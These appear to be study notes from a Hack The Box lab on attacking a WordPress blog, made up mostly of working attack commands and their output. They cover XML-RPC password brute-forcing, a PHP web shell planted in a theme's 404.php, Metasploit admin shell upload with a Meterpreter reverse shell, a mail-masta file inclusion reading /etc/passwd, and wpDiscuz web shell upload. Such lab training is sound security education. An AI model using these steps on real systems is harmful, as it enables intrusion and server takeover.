## Login Bruteforce

```shell
3kjS@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
![](Screenshot%202026-07-28%20at%2013.43.14.png)
## Code Execution

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

```php
system($_GET[0]);
```

```url
http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
```
![](Pasted%20image%2020260728134449.png)

```shell
3kjS@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.

```shell
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp 

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST 
blog.inlanefreight.local
```
## Leveraging Known Vulnerabilities

According to the WordPress Vulnerability Statistics page hosted [here](https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:

- 4% WordPress core
- 89% plugins
- 7% themes
Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine.
#### Vulnerable Plugins - mail-masta

Let's take a look at the vulnerable code for the mail-masta plugin.

```php
<?php 

include($_GET['pl']); 
global $wpdb; 

$camp_id=$_POST['camp_id']; 
$masta_reports = $wpdb->prefix . "masta_reports"; 
$count=$wpdb->get_results("SELECT count(*) co from $masta_reports where 
camp_id=$camp_id and status=1"); 

echo $count[0]->co; 

?>
```

```shell
3kjS@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
![](Screenshot%202026-07-28%20at%2013.49.10.png)
#### Vulnerable Plugins - wpDiscuz

```shell
3kjS@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
![](Screenshot%202026-07-28%20at%2013.49.32.png)

The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

```shell
3kjS@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id 

GIF689a; 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
